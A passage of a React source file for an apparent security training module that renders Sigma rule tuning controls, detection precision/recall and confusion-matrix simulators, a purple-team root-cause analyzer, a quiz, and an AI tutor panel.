                        ? "bg-purple-500/10 border-purple-500 text-white"
                        : "bg-slate-950/60 border-slate-800 text-slate-400 hover:border-slate-700"
                    }`}
                  >
                    <div className="font-bold text-xs text-white">{tpl.label}</div>
                    <div className="text-[11px] text-purple-400 font-mono mt-1">{tpl.type}</div>
                  </button>
                ))}
              </div>

              {/* Parameters Slider / Controls */}
              {sigmaRuleType === "auth_failure" && (
                <div className="p-4 rounded-xl bg-slate-950/80 border border-slate-800 mb-6">
                  <div className="text-xs font-bold text-white mb-3 flex items-center gap-2">
                    <Sliders className="w-4 h-4 text-purple-400" /> Rule Tuning Parameters
                  </div>
                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-6 text-xs">
                    <div>
                      <div className="flex justify-between text-slate-300 mb-1">
                        <span>Threshold Count:</span>
                        <span className="font-mono font-bold text-purple-400">&gt; {sigmaThresholdCount} events</span>
                      </div>
                      <input
                        type="range"
                        min={1}
                        max={10}
                        value={sigmaThresholdCount}
                        onChange={(e) => setSigmaThresholdCount(parseInt(e.target.value))}
                        className="w-full accent-purple-500"
                      />
                    </div>

                    <div>
                      <div className="flex justify-between text-slate-300 mb-1">
                        <span>Timeframe Window:</span>
                        <span className="font-mono font-bold text-cyan-400">{sigmaTimeframeWindow}</span>
                      </div>
                      <select
                        value={sigmaTimeframeWindow}
                        onChange={(e) => setSigmaTimeframeWindow(e.target.value)}
                        className="w-full p-1.5 rounded bg-slate-900 border border-slate-800 text-slate-300 text-xs"
                      >
                        <option value="30s">30 Seconds</option>
                        <option value="1m">1 Minute</option>
                        <option value="5m">5 Minutes</option>
                        <option value="15m">15 Minutes</option>
                      </select>
                    </div>

                    <div>
                      <div className="flex justify-between text-slate-300 mb-1">
                        <span>Exclusions:</span>
                        <span className="font-mono font-bold text-emerald-400">{sigmaExcludeServiceAccounts ? "Enabled" : "Disabled"}</span>
                      </div>
                      <label className="flex items-center gap-2 mt-1 cursor-pointer">
                        <input
                          type="checkbox"
                          checked={sigmaExcludeServiceAccounts}
                          onChange={(e) => setSigmaExcludeServiceAccounts(e.target.checked)}
                          className="rounded text-purple-500 focus:ring-0"
                        />
                        <span className="text-slate-400 text-[11px]">Exclude &apos;svc-*&apos; service accounts</span>
                      </label>
                    </div>
                  </div>
                </div>
              )}

              {/* Split Editor & Test Runner */}
              <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                <div className="p-4 rounded-xl bg-slate-950 border border-slate-800">
                  <div className="text-xs font-bold text-white mb-2 flex items-center gap-2">
                    <FileCode className="w-4 h-4 text-purple-400" /> Live Sigma YAML Definition
                  </div>
                  <pre className="p-3 rounded bg-slate-900 border border-slate-800 text-[11px] font-mono text-purple-300 overflow-x-auto max-h-96 leading-relaxed">
                    {generatedSigmaYaml}
                  </pre>
                </div>

                <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 flex flex-col justify-between">
                  <div>
                    <div className="text-xs font-bold text-white mb-2 flex items-center gap-2">
                      <TestTube2 className="w-4 h-4 text-cyan-400" /> Synthetic Test Suite & Regression Verification
                    </div>

                    <div className="p-3 rounded bg-slate-900 border border-slate-800 space-y-3 mb-4">
                      <div className="flex items-center justify-between text-xs">
                        <span className="text-slate-400">Test Case 1 (5 rapid failures for lab-user-01):</span>
                        <span className={`font-mono font-bold px-2 py-0.5 rounded ${syntheticRunnerOutput.matched ? "bg-emerald-500/20 text-emerald-400" : "bg-rose-500/20 text-rose-400"}`}>
                          {syntheticRunnerOutput.matched ? "TRIGGERED" : "SILENT"}
                        </span>
                      </div>
                      <div className="flex items-center justify-between text-xs">
                        <span className="text-slate-400">Test Case 2 (Service account automated backup):</span>
                        <span className="font-mono font-bold px-2 py-0.5 rounded bg-cyan-500/20 text-cyan-400">
                          {sigmaExcludeServiceAccounts ? "SUPPRESSED (BENIGN)" : "ALERTED (FALSE POSITIVE)"}
                        </span>
                      </div>
                      <div className="flex items-center justify-between text-xs">
                        <span className="text-slate-400">Test Case 3 (Single failure on lab-user-02):</span>
                        <span className="font-mono font-bold px-2 py-0.5 rounded bg-slate-800 text-slate-300">
                          FILTERED (BELOW THRESHOLD)
                        </span>
                      </div>
                    </div>

                    <div className="p-3 rounded-lg bg-purple-500/10 border border-purple-500/20 text-xs text-purple-300 font-mono">
                      {syntheticRunnerOutput.verdict}
                    </div>
                  </div>

                  <div className="mt-4 pt-3 border-t border-slate-800 flex items-center justify-between text-xs">
                    <span className="text-slate-400">Regression Test Suite:</span>
                    <span className="font-bold text-emerald-400 flex items-center gap-1">
                      <CheckCircle2 className="w-4 h-4" /> 3 of 3 Passed (0 Regressions)
                    </span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* ================================================================== */}
        {/* TAB 4: SIMULATOR 3 - DETECTION METRICS, PRECISION & RECALL         */}
        {/* ================================================================== */}
        {activeTab === "metrics-sim" && (
          <div className="space-y-8">
            <div className="bg-slate-900/60 border border-slate-800 rounded-2xl p-6 sm:p-8">
              <div className="flex flex-wrap items-center justify-between gap-4 mb-6">
                <div>
                  <span className="px-2.5 py-0.5 rounded-full text-xs font-medium bg-purple-500/10 text-purple-400 border border-purple-500/20">
                    Simulator 3
                  </span>
                  <h3 className="text-xl font-bold text-white mt-2">
                    Detection Metrics, Precision, Recall & Confusion Matrix Sandbox
                  </h3>
                  <p className="text-xs text-slate-400 mt-1">
                    Adjust test-run outcomes dynamically and calculate Recall, Precision, F1-Score, and False Positive Rates.
                  </p>
                </div>

                <button
                  onClick={() => {
                    setTp(90);
                    setFn(10);
                    setFp(2);
                    setTn(18);
                    setMttdSeconds(42);
                    setMttrMinutes(14);
                  }}
                  className="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs flex items-center gap-1.5 transition"
                >
                  <RotateCcw className="w-3.5 h-3.5" /> Reset to Section 22.10 Example
                </button>
              </div>

              {/* Sliders Grid */}
              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 mb-8">
                <div className="p-4 rounded-xl bg-slate-950/80 border border-slate-800">
                  <div className="flex justify-between text-xs mb-1">
                    <span className="text-slate-400">True Positives (TP):</span>
                    <span className="font-mono font-bold text-emerald-400">{tp}</span>
                  </div>
                  <input
                    type="range"
                    min={0}
                    max={100}
                    value={tp}
                    onChange={(e) => setTp(parseInt(e.target.value))}
                    className="w-full accent-emerald-500"
                  />
                  <div className="text-[10px] text-slate-500 mt-1">Adversary attacks correctly caught</div>
                </div>

                <div className="p-4 rounded-xl bg-slate-950/80 border border-slate-800">
                  <div className="flex justify-between text-xs mb-1">
                    <span className="text-slate-400">False Negatives (FN):</span>
                    <span className="font-mono font-bold text-rose-400">{fn}</span>
                  </div>
                  <input
                    type="range"
                    min={0}
                    max={50}
                    value={fn}
                    onChange={(e) => setFn(parseInt(e.target.value))}
                    className="w-full accent-rose-500"
                  />
                  <div className="text-[10px] text-slate-500 mt-1">Adversary attacks missed (Blind spots)</div>
                </div>

                <div className="p-4 rounded-xl bg-slate-950/80 border border-slate-800">
                  <div className="flex justify-between text-xs mb-1">
                    <span className="text-slate-400">False Positives (FP):</span>
                    <span className="font-mono font-bold text-amber-400">{fp}</span>
                  </div>
                  <input
                    type="range"
                    min={0}
                    max={50}
                    value={fp}
                    onChange={(e) => setFp(parseInt(e.target.value))}
                    className="w-full accent-amber-500"
                  />
                  <div className="text-[10px] text-slate-500 mt-1">Benign events triggering alarms</div>
                </div>

                <div className="p-4 rounded-xl bg-slate-950/80 border border-slate-800">
                  <div className="flex justify-between text-xs mb-1">
                    <span className="text-slate-400">True Negatives (TN):</span>
                    <span className="font-mono font-bold text-cyan-400">{tn}</span>
                  </div>
                  <input
                    type="range"
                    min={0}
                    max={100}
                    value={tn}
                    onChange={(e) => setTn(parseInt(e.target.value))}
                    className="w-full accent-cyan-500"
                  />
                  <div className="text-[10px] text-slate-500 mt-1">Benign events correctly ignored</div>
                </div>
              </div>

              {/* Calculated Metrics Cards */}
              <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 mb-8 text-center">
                <div className="p-4 rounded-xl bg-slate-950 border border-slate-800">
                  <div className="text-xs text-slate-400 mb-1">Recall (TPR)</div>
                  <div className="text-2xl font-extrabold text-emerald-400 font-mono">{metrics.recall}%</div>
                  <div className="text-[10px] text-slate-500 font-mono mt-1">TP / (TP + FN)</div>
                </div>

                <div className="p-4 rounded-xl bg-slate-950 border border-slate-800">
                  <div className="text-xs text-slate-400 mb-1">Precision</div>
                  <div className="text-2xl font-extrabold text-purple-400 font-mono">{metrics.precision}%</div>
                  <div className="text-[10px] text-slate-500 font-mono mt-1">TP / (TP + FP)</div>
                </div>

                <div className="p-4 rounded-xl bg-slate-950 border border-slate-800">
                  <div className="text-xs text-slate-400 mb-1">F1-Score</div>
                  <div className="text-2xl font-extrabold text-cyan-400 font-mono">{metrics.f1}%</div>
                  <div className="text-[10px] text-slate-500 font-mono mt-1">Harmonic Mean</div>
                </div>

                <div className="p-4 rounded-xl bg-slate-950 border border-slate-800">
                  <div className="text-xs text-slate-400 mb-1">False Positive Rate</div>
                  <div className="text-2xl font-extrabold text-amber-400 font-mono">{metrics.fpr}%</div>
                  <div className="text-[10px] text-slate-500 font-mono mt-1">FP / (FP + TN)</div>
                </div>
              </div>

              {/* Visual 2x2 Confusion Matrix */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div className="p-5 rounded-xl bg-slate-950 border border-slate-800">
                  <h4 className="text-sm font-bold text-white mb-3 flex items-center gap-2">
                    <BarChart3 className="w-4 h-4 text-purple-400" /> Visual 2x2 Confusion Matrix
                  </h4>

                  <div className="grid grid-cols-2 gap-2 text-center text-xs font-mono">
                    <div className="p-4 rounded-lg bg-emerald-500/10 border border-emerald-500/30">
                      <div className="text-emerald-400 font-bold text-lg">{tp}</div>
                      <div className="text-white font-sans text-xs mt-1">True Positive (TP)</div>
                      <div className="text-[10px] text-slate-400">Correct Detection</div>
                    </div>
                    <div className="p-4 rounded-lg bg-amber-500/10 border border-amber-500/30">
                      <div className="text-amber-400 font-bold text-lg">{fp}</div>
                      <div className="text-white font-sans text-xs mt-1">False Positive (FP)</div>
                      <div className="text-[10px] text-slate-400">Type I Error (Noise)</div>
                    </div>
                    <div className="p-4 rounded-lg bg-rose-500/10 border border-rose-500/30">
                      <div className="text-rose-400 font-bold text-lg">{fn}</div>
                      <div className="text-white font-sans text-xs mt-1">False Negative (FN)</div>
                      <div className="text-[10px] text-slate-400">Type II Error (Missed)</div>
                    </div>
                    <div className="p-4 rounded-lg bg-cyan-500/10 border border-cyan-500/30">
                      <div className="text-cyan-400 font-bold text-lg">{tn}</div>
                      <div className="text-white font-sans text-xs mt-1">True Negative (TN)</div>
                      <div className="text-[10px] text-slate-400">Correct Inaction</div>
                    </div>
                  </div>
                </div>

                <div className="p-5 rounded-xl bg-slate-950 border border-slate-800 flex flex-col justify-between">
                  <div>
                    <h4 className="text-sm font-bold text-white mb-2 flex items-center gap-2">
                      <Gauge className="w-4 h-4 text-cyan-400" /> SOC Operational Impact Analysis
                    </h4>
                    <div className="space-y-3 text-xs text-slate-300">
                      <p>
                        <strong className="text-emerald-400">Recall ({metrics.recall}%):</strong> Represents your coverage against known attack variations. Missed cases (FN = {fn}) indicate tradecraft that successfully circumvented your current telemetry or Sigma correlation.
                      </p>
                      <p>
                        <strong className="text-purple-400">Precision ({metrics.precision}%):</strong> Governs analyst confidence. With FP = {fp}, {metrics.precision}% of all tickets raised represent actual adversary execution rather than false alarms.
                      </p>
                      <p>
                        <strong className="text-amber-400">Alert Fatigue Index:</strong> Lower precision forces Tier 1 analysts to sift through noise, leading to dangerous triage delays.
                      </p>
                    </div>
                  </div>

                  <div className="mt-4 pt-3 border-t border-slate-800 flex items-center justify-between text-xs font-mono text-slate-400">
                    <span>Simulated MTTD: <strong>{mttdSeconds}s</strong></span>
                    <span>Simulated MTTR: <strong>{mttrMinutes}m</strong></span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* ================================================================== */}
        {/* TAB 5: SIMULATOR 4 - PURPLE TEAM ROOT-CAUSE GAP ANALYZER           */}
        {/* ================================================================== */}
        {activeTab === "purpleteam-sim" && (
          <div className="space-y-8">
            <div className="bg-slate-900/60 border border-slate-800 rounded-2xl p-6 sm:p-8">
              <div className="flex flex-wrap items-center justify-between gap-4 mb-6">
                <div>
                  <span className="px-2.5 py-0.5 rounded-full text-xs font-medium bg-purple-500/10 text-purple-400 border border-purple-500/20">
                    Simulator 4
                  </span>
                  <h3 className="text-xl font-bold text-white mt-2">
                    Purple Team Exercise Tracker & Root-Cause Gap Analyzer
                  </h3>
                  <p className="text-xs text-slate-400 mt-1">
                    Isolate pipeline failure stages, inspect root causes, and simulate collaborative engineering remediation.
                  </p>
                </div>
              </div>

              {/* Scenario Selector */}
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 mb-6">
                {Object.keys(ptScenarios).map((key) => {
                  const sc = ptScenarios[key];
                  const isSelected = selectedPtScenario === key;
                  return (
                    <button
                      key={key}
                      onClick={() => setSelectedPtScenario(key)}
                      className={`p-4 rounded-xl text-left border transition ${
                        isSelected
                          ? "bg-purple-500/10 border-purple-500 text-white"
                          : "bg-slate-950/60 border-slate-800 text-slate-400 hover:border-slate-700"
                      }`}
                    >
                      <div className="font-mono font-bold text-[10px] text-purple-400 mb-1">{sc.id}</div>
                      <div className="font-bold text-xs text-white mb-1">{sc.title}</div>
                      <div className="text-[11px] text-slate-400">{sc.technique}</div>
                    </button>
                  );
                })}
              </div>

              {/* 5-Stage Root Cause Selector */}
              <div className="p-4 rounded-xl bg-slate-950/80 border border-slate-800 mb-6">
                <div className="text-xs font-bold text-white mb-3 flex items-center gap-2">
                  <Workflow className="w-4 h-4 text-purple-400" /> Select Pipeline Failure Stage to Analyze Root Cause
                </div>

                <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-2 text-xs">
                  {[
                    { id: "none", label: "Flawless" },
                    { id: "collection", label: "1. Collection" },
                    { id: "parsing", label: "2. Parsing" },
                    { id: "analytic", label: "3. Analytic" },
                    { id: "routing", label: "4. Routing" },
                    { id: "enrichment", label: "5. Enrichment" },
                  ].map((st) => (
                    <button
                      key={st.id}
                      onClick={() => setInjectedFailureStage(st.id)}
                      className={`p-2.5 rounded-lg border text-center transition font-semibold text-xs ${
                        injectedFailureStage === st.id
                          ? "bg-purple-600 text-white border-purple-500"
                          : "bg-slate-900 border-slate-800 text-slate-300 hover:bg-slate-800"
                      }`}
                    >
                      {st.label}
                    </button>
                  ))}
                </div>
              </div>

              {/* Diagnostics Card */}
              <div className="p-6 rounded-xl bg-slate-950 border border-slate-800">
                <div className="flex flex-wrap items-center justify-between gap-2 mb-4 border-b border-slate-800 pb-3">
                  <div className="flex items-center gap-2">
                    <span className="font-bold text-white text-sm">
                      {failureStageDetails[injectedFailureStage].label}
                    </span>
                  </div>
                  <span className={`px-2.5 py-0.5 rounded text-[11px] font-mono font-bold ${
                    injectedFailureStage === "none"
                      ? "bg-emerald-500/20 text-emerald-400"
                      : "bg-rose-500/20 text-rose-400"
                  }`}>
                    {failureStageDetails[injectedFailureStage].healthStatus}
                  </span>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-3 gap-6 text-xs">
                  <div className="p-4 rounded-lg bg-slate-900 border border-slate-800">
                    <div className="font-bold text-amber-400 mb-2 flex items-center gap-1.5">
                      <AlertCircle className="w-4 h-4" /> Observed Symptom
                    </div>
                    <p className="text-slate-300 leading-relaxed">
                      {failureStageDetails[injectedFailureStage].symptom}
                    </p>
                  </div>

                  <div className="p-4 rounded-lg bg-slate-900 border border-slate-800">
                    <div className="font-bold text-rose-400 mb-2 flex items-center gap-1.5">
                      <Bug className="w-4 h-4" /> Root Cause Analysis
                    </div>
                    <p className="text-slate-300 leading-relaxed">
                      {failureStageDetails[injectedFailureStage].rootCause}
                    </p>
                  </div>

                  <div className="p-4 rounded-lg bg-slate-900 border border-slate-800">
                    <div className="font-bold text-emerald-400 mb-2 flex items-center gap-1.5">
                      <CheckCircle2 className="w-4 h-4" /> Engineering Remediation
                    </div>
                    <p className="text-slate-300 leading-relaxed">
                      {failureStageDetails[injectedFailureStage].remediation}
                    </p>
                  </div>
                </div>

                {injectedFailureStage !== "none" && (
                  <div className="mt-6 p-3 rounded-lg bg-purple-500/10 border border-purple-500/20 flex items-center justify-between">
                    <span className="text-xs text-purple-300">
                      Collaborative Fix Proposed: Assign to Detection Engineering & SecOps on-call.
                    </span>
                    <button
                      onClick={() => setInjectedFailureStage("none")}
                      className="px-3 py-1 rounded bg-purple-600 hover:bg-purple-500 text-white font-bold text-xs flex items-center gap-1.5 transition"
                    >
                      <RefreshCw className="w-3.5 h-3.5" /> Apply Fix & Re-run Validation
                    </button>
                  </div>
                )}
              </div>
            </div>
          </div>
        )}

        {/* ================================================================== */}
        {/* TAB 6: KNOWLEDGE ASSESSMENT QUIZ (10 QUESTIONS)                   */}
        {/* ================================================================== */}
        {activeTab === "quiz" && (
          <div className="space-y-8">
            <div className="bg-slate-900/60 border border-slate-800 rounded-2xl p-6 sm:p-8">
              <div className="flex flex-wrap items-center justify-between gap-4 mb-6">
                <div>
                  <span className="px-2.5 py-0.5 rounded-full text-xs font-medium bg-purple-500/10 text-purple-400 border border-purple-500/20">
                    Section 22.13
                  </span>
                  <h3 className="text-xl font-bold text-white mt-2">
                    Module 22 Knowledge Assessment
                  </h3>
                  <p className="text-xs text-slate-400 mt-1">
                    Test your understanding of adversary simulation, telemetry pipelines, Sigma detection engineering, and purple team workflows.
                  </p>
                </div>

                <div className="text-right">
                  <div className="text-xs text-slate-400">
                    {Object.keys(quizAnswers).length} of {quizQuestions.length} Answered
                  </div>
                  {quizSubmitted && (
                    <div className="text-sm font-bold mt-1 text-purple-400">
                      Score: {quizScore} / {quizQuestions.length} ({Math.round((quizScore / quizQuestions.length) * 100)}%)
                    </div>
                  )}
                </div>
              </div>

              {/* Questions List */}
              <div className="space-y-6">
                {quizQuestions.map((q, idx) => {
                  const selected = quizAnswers[q.id];
                  const isCorrect = selected === q.correctAnswer;
                  return (
                    <div
                      key={q.id}
                      className="p-5 rounded-xl bg-slate-950/80 border border-slate-800 transition"
                    >
                      <div className="font-bold text-sm text-white mb-3 flex items-start gap-2.5">
                        <span className="w-6 h-6 rounded-full bg-purple-500/20 text-purple-300 flex items-center justify-center text-xs shrink-0 mt-0.5">
                          {idx + 1}
                        </span>
                        <span>{q.question}</span>
                      </div>

                      <div className="space-y-2 mb-3">
                        {q.options.map((opt, oIdx) => {
                          const isOptionSelected = selected === oIdx;
                          let btnStyle = "bg-slate-900 border-slate-800 text-slate-300 hover:bg-slate-800";

                          if (quizSubmitted) {
                            if (oIdx === q.correctAnswer) {
                              btnStyle = "bg-emerald-500/20 border-emerald-500 text-emerald-300 font-bold";
                            } else if (isOptionSelected) {
                              btnStyle = "bg-rose-500/20 border-rose-500 text-rose-300";
                            }
                          } else if (isOptionSelected) {
                            btnStyle = "bg-purple-600 text-white font-bold border-purple-500";
                          }

                          return (
                            <button
                              key={oIdx}
                              onClick={() => handleSelectOption(q.id, oIdx)}
                              className={`w-full text-left p-3 rounded-lg border text-xs transition flex items-center justify-between ${btnStyle}`}
                            >
                              <span>{opt}</span>
                              {quizSubmitted && oIdx === q.correctAnswer && (
                                <CheckCircle className="w-4 h-4 text-emerald-400 shrink-0 ml-2" />
                              )}
                              {quizSubmitted && isOptionSelected && oIdx !== q.correctAnswer && (
                                <XCircle className="w-4 h-4 text-rose-400 shrink-0 ml-2" />
                              )}
                            </button>
                          );
                        })}
                      </div>

                      {quizSubmitted && (
                        <div className="p-3 rounded-lg bg-slate-900/90 border border-slate-800 text-xs text-slate-300 leading-relaxed">
                          <span className="font-bold text-purple-400">Explanation: </span>
                          {q.explanation}
                        </div>
                      )}
                    </div>
                  );
                })}
              </div>

              {/* Action Buttons */}
              <div className="mt-8 flex items-center justify-between pt-4 border-t border-slate-800">
                <button
                  onClick={resetQuiz}
                  className="px-4 py-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-medium transition flex items-center gap-1.5"
                >
                  <RotateCcw className="w-3.5 h-3.5" /> Reset Quiz
                </button>

                {!quizSubmitted ? (
                  <button
                    onClick={() => setQuizSubmitted(true)}
                    disabled={Object.keys(quizAnswers).length < quizQuestions.length}
                    className="px-6 py-2.5 rounded-xl bg-purple-600 hover:bg-purple-500 text-white font-bold text-xs disabled:opacity-50 transition shadow-lg"
                  >
                    Submit Quiz
                  </button>
                ) : (
                  <div className="text-xs font-bold text-purple-400">
                    Assessment Complete! Check rationales above.
                  </div>
                )}
              </div>
            </div>
          </div>
        )}
      </main>

      {/* Embedded Nova AI Tutor Drawer */}
      <LearningRo
        isOpen={showAiTutor}
        onClose={() => setShowAiTutor(false)}
        moduleTitle="Red & Blue Team Ops, Detection Engineering & Purple Teaming"
        moduleId="red-blue-purple-teams"
        systemPrompt={`You are Nova, an expert Senior Detection Engineer, Red Team Operator, and Purple Team Exercise Lead.
You guide learners through adversary simulation planning (NIST SP 800-115), telemetry pipeline debugging, Sigma rule authoring, alert triage workflows, precision/recall metrics, and collaborative purple team validation.
Answer technically, precisely, and emphasize ethical authorization, non-destructive simulation, and test validation.`}
        sampleQuestions={[
          "What is the core operational difference between a Penetration Test and a Red Team engagement?",
          "How do I write a portable Sigma rule for brute-force password guessing with threshold correlation?",
          "If an event is missing from the SIEM during a purple team test, what root causes should I investigate first?",
          "How do I calculate Precision and Recall for an identity detection rule, and what do they mean for SOC alert fatigue?",
        ]}
      />
    </div>
  );
}
